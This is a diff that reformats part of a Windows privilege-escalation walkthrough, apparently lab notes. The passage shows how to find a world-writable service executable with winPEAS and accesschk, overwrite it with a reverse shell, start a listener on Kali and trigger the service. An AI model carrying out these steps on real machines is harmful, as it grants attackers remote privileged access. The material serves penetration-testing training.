@@ -464,18 +464,12 @@ Run winPEAS to check for service misconfigurations:
 > .\winPEASany.exe quiet servicesinfo
 2. Note that the “filepermsvc” service has an executable which appears to be
 writable by everyone. We can confirm this with accesschk.exe:
-> .\accesschk.exe /accepteula -quvw "C:\Program
-Files\File Permissions Service\filepermservice.exe"
+> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
 3. Create a backup of the original service executable:
-> copy "C:\Program Files\File Permissions
-Service\filepermservice.exe" C:\Temp 
-Copy the reverse shell executable to overwrite the service
-executable:
-> copy /Y C:\PrivEsc\reverse.exe "C:\Program
-Files\File Permissions
-Service\filepermservice.exe"
-5. Start a listener on Kali, and then start the service to trigger the
-exploit:
+> copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp 
+Copy the reverse shell executable to overwrite the service executable:
+> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+5. Start a listener on Kali, and then start the service to trigger the exploit:
 > net start filepermsvc
 ```
 ### Iperius Backup 6.1.0 - Privilege Escalation
